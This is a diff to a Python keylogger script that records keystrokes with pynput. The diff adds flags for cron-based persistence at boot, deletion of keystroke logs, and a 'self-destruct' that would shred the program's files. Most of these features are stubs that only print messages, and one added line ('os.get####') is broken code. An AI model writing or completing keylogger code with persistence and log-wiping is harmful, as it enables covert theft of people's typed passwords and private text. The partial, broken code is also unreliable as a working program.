@@ -1,11 +1,76 @@
 #! /usr/bin/env python3
 
 from pynput import keyboard
+import argparse
+import time
 
+
+parser = argparse.ArgumentParser(description="Python3 Keylogger")
 lst2 = []
 fullstr = []
 fullstr2 = ""
 F = '1'
+
+def capturetheflags():
+	## Flags
+	parser = argparse.ArgumentParser()
+
+	parser.add_argument("-rs", "--run-at-start", help="Run the program on bootup", action="store_true")
+	parser.add_argument("-rx", "--remove-start", help="Stop the program from running on bootup", action="store_true")
+	parser.add_argument("-rl", "--remove-logs", help="Remove all the keystroke logs", action="store_true")
+	parser.add_argument("-i", "--info", help="Displays information about the program and its files", action="store_true")
+	parser.add_argument("-sd", "--self-destruct", help="!!! This action completely destroys the program !!!", action="store_true")
+
+	args = parser.parse_args()
+
+	rs = getattr(args, 'run_at_start')
+	rx = getattr(args, 'remove_start')
+	rl = getattr(args, 'remove_logs')
+	i = getattr(args, 'info')
+	sd = getattr(args, "self_destruct")
+
+	if rs == True:
+		# Looks for script name in chron file
+		## If not found, open chron file and add script line and save
+		## close file
+		print ("Run at start enabled")
+
+	if rx == True:
+		# Looks for script name in chron file
+		## If found, open chron file and remove script line and save
+		## close file
+		print ("Run at start disabled")	
+
+	if rl == True:
+		# Looks for where/the/logs/are/kept/ and removes them
+		print ("Removing Logs..")	
+
+	if i == True:
+		# Looks for created files & grabs memory & cpu usage
+		print ("Obtaining information..")
+
+	if sd == True:
+		# Looks for all files associated with program and puts them into a list
+		# & 
+		# if script name is in chron file
+		print("[WARNING]: This will delete the program and associated files from the system.")
+		time.sleep(1.6)
+		print("[WARNING]: This action cannot be undone.")
+		while True:
+			time.sleep(2.2)
+			confirm = input(" > Confirm? [Y/N]: ")
+			# If confirmed run task
+			if confirm.lower() == 'y':
+				print("Confirmed")
+				## For each file in file, shred -uz file
+				return False
+			# If cancelled run task
+			elif confirm.lower() == 'n':
+				print("Cancelled")
+				return False
+			else:
+				print("input not recgonized try again.")
+
 
 def sort_key(key):
 	global F
@@ -61,8 +126,11 @@ def sort_key(key):
 ## Main Function
 def __main__():
 	print("\nOpening Log File...\n")
+
+	capturetheflags()
+
 	## Open log file here
-	
+	wLogfile = os.get####
 	#starts listening to the keyboard
 	try:
 		with keyboard.Listener(on_press=sort_key) as l:
